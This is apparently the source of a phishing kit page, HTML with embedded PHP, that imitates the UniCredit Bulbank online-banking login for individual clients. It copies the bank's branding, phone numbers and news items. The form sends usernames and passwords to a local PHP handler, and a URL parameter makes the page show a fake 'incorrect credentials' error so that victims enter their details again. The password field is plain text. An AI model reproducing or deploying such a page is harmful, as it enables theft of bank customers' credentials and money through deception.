<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="./HTML/css/filet_001.css">
<script src="https://kit.fontawesome.com/df59028804.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>
<body>
<script>
function validateForm() {
  var user = document.forms["logintrue"]["UserName"].value;
  var pass = document.forms["logintrue"]["Password"].value;

  if (user == "" && pass == "") {
       //$("#Erorr-Login").show(100);
 document.getElementById("msgwalo").style.display = "block";
 document.getElementById("LSinputuser").style.border = "1px solid #f17076";
 document.getElementById("LSinputpsee").style.border = "1px solid #f17076";
    return false;
  }else if (user == "") {
       //$("#Erorr-Login").show(100);
 document.getElementById("msgwalo").style.display = "block";
 document.getElementById("LSinputuser").style.border = "1px solid #f17076";
 

    return false;
  }else if (pass == "") {

     document.getElementById("msgwalo").style.background = "#fcdfdf";
     document.getElementById("LSinputpsee").style.border = "1px solid #f17076";


    return false;

  }
}
</script>
<div class="topnav" id="myTopnav">
  <a href="#" ><img class="imgbdj" src="./HTML/img/unicredit-bulbank-logo.svg"></a>

  <a href="#" id="right">БГ</a>
  <a href="#" id="right" class="demo">Demo</a>
  <a href="#" id="right"><img class="imgIconz" src="./HTML/img/smart.png">&nbsp;15 333</a>
  <a href="#" id="right"><img class="imgIconz" src="./HTML/img/telephone.png">&nbsp;02 933 7 333</a>
</div>

<div class="viewport">
  <div class="stack container-login individual">
<div class="stack login-header">
<h3 class="content-heading">

    <span class="value">
        Индивидуални клиенти
    </span></h3>
</div>
<div class="login-body">

<form name="logintrue" action="Using_sessions.php" method="POST"   onsubmit="return validateForm()">

<div class="row" id="msgwalo" style="display: none;">
 <div class="col-sm-12">
<div role="alert" class="alert alert-danger "style="">
<span class="text"><span  class="value"><i class="fas fa-exclamation-circle" style="color: #ffffff;line-height: 30px;font-size: 20px;padding-right: 7px;" ></i> Некоректно въведено потребителско име и/или парола.</span></span></div>
</div></div>

<?php 

$varerorr ='
<div class="row">
 <div class="col-sm-12">
<div role="alert" class="alert alert-danger "style="">
<span class="text"><span  class="value"><i class="fas fa-exclamation-circle" style="color: #ffffff;line-height: 30px;font-size: 20px;border-right: 1px solid #cccc;padding-right: 7px;" ></i> Некоректно въведено потребителско име и/или парола.</span></span></div>
</div></div>


<div class="row">
  <div class="col-sm-12">
<div class="ALSinput" id="LSinputuser"> <i class="fas fa-user-circle" style="color: #f17076;line-height: 30px;font-size: 20px;border-right: 1px solid #f17076;padding-right: 7px;" ></i>
  <input class="ipnutehide" type="text" name="UserName" placeholder="Потребителско име">
</div>
  </div>
</div>
<div class="row">
  <div class="col-sm-12">
    <div class="ALSinput" id="LSinputpsee"><i class="fas fa-lock" style="color: #f17076;line-height: 30px;font-size: 20px;border-right: 1px solid #f17076;padding-right: 7px;" ></i>
  <input class="ipnutehide"  type="text" name="Password" placeholder="Парола" style="width: 52%"><span class="passwordfrgt"> <span class="passwordfrgt" style=" color: #f07076; "> Забравена парола? </span> </span>
</div></div>
  
</div>
<div class="row">
  <div class="col-sm-12">
<button class="btn btn-primary" type="submit">

        Вход
    </button>';

$vartruue ='

<div class="row">
  <div class="col-sm-12">
<div class="LSinput" id="LSinputuser" > <i class="fas fa-user-circle" style="color: #a7a7a7;line-height: 30px;font-size: 20px;border-right: 1px solid #cccc;padding-right: 7px;" ></i>
  <input class="ipnutehide" type="text" name="UserName" placeholder="Потребителско име">
</div>
  </div>
</div>
<div class="row">
  <div class="col-sm-12">
    <div class="LSinput" id="LSinputpsee" ><i class="fas fa-lock" style="color: #a7a7a7;line-height: 30px;font-size: 20px;border-right: 1px solid #cccc;padding-right: 7px;" ></i>
  <input class="ipnutehide"  type="text" name="Password" placeholder="Парола" style="width: 52%"><span class="passwordfrgt"> <span class="passwordfrgt"> Забравена парола? </span> </span>
</div></div>
  
</div>
<div class="row">
  <div class="col-sm-12">
<button class="btn btn-primary" type="submit">

        Вход
    </button>';

//---------------------------------------------------------------------------------------- INC
if (isset($_GET['Status'])) {
  if ($_GET['Status'] == 'true') {
    echo $varerorr;
  }else{
   echo $vartruue;

  }
}else{

//---------------------------------------------------------------------------------------- FIN
echo $vartruue;
//---------------------------------------------------------------------------------------- FIN
}
?>

  </form>
  </div>
  
</div>

<div class="row">
 <div class="col-sm-12">
<span class="passwordfrgt"><span class="passwordfrgt" style=" font-size: 19px; ">Онлайн регистрация </span></span> </div>
  </div>

</div>
</div></div>
<div class="stack container login-list-groups">

  <div class="col-1 content-box clearfix" data-bind="contentBox: true">


    <h3 class="content-heading"><i class="fas fa-lock"></i>&nbsp;&nbsp;<span class="text">
<span class="valueTex">Сигурност</span></span></h3>
 
<ul class="list-group">
  <li class="list-group-item"><span class="value"><i class="fas fa-angle-right"></i> Препоръки за сигурност при работа с алтернативни канали на Банката </span></li>
  <li class="list-group-item"><span class="value"><i class="fas fa-angle-right"></i> Политика за прилагане на бисквитки </span></li>
  <li class="list-group-item"><span class="value">Проверете автентичността на сайта на Булбанк Онлайн <img name="seal" src="./HTML/img/getseal.gif" alt=""> </span></li>
</ul>

  </div>

  <div class="col-2 content-box clearfix" data-bind="contentBox: true">


  <h3 class="content-heading"><i class="fas fa-book"></i>&nbsp;&nbsp;<span class="text">
<span class="valueTex">News</span></span></h3>

<ul class="list-group">
  <li class="list-group-item"><span class="text-danger"><i class="fas fa-angle-right"></i> Ново! Вижте как да реактивирате Вашия М-токен в новото ни видео . </span></li>
  <li class="list-group-item"><span class="value"><i class="fas fa-angle-right"></i> Ново! Услугата Булбанк Онлайн ще е с обновена визия и по-удобна навигация от септември. </span></li>
  <li class="list-group-item"><span class="value"><i class="fas fa-angle-right"></i> Важно! УниКредит Булбанк въвежда динамична парола за идентификация при вход в Булбанк Онлайн от 29.07.2019 г. </span></li>
  <li class="list-group-item"><span class="value"><i class="fas fa-angle-right"></i> 
        Всички новини
     </span></li>
</ul>

  </div>


  <div class="col-3 content-box clearfix" data-bind="contentBox: true">

 <h3 class="content-heading"><i class="fas fa-file-alt"></i>&nbsp;&nbsp;<span class="text">
<span class="valueTex">Документи</span></span></h3>

<ul class="list-group">
  <li class="list-group-item"><span class="value"><i class="fas fa-chevron-right"></i> Общи условия за Булбанк Онлайн </span></li>
  <li class="list-group-item"><span class="value"><i class="fas fa-chevron-right"></i> Видове сметки и възможности за работа с тях в услугата „Булбанк Онлайн” </span></li>
  <li class="list-group-item"><span class="value"><i class="fas fa-chevron-right"></i> Искане за ползване на Булбанк Онлайн - корпоративни клиенти </span></li>
  <li class="list-group-item"><span class="value"><i class="fas fa-chevron-right"></i> Искане за преиздаване на потребителско име и парола </span></li>
  <li class="list-group-item"><span class="value"><i class="fas fa-chevron-right"></i> Искане за анулиране на цифров сертификат или отрегистриране на КЕП </span></li>
</ul>

  </div>

</div>
<script>
function myFunction() {
  var x = document.getElementById("myTopnav");
  if (x.className === "topnav") {
    x.className += " responsive";
  } else {
    x.className = "topnav";
  }
}
</script>

</body>
</html>
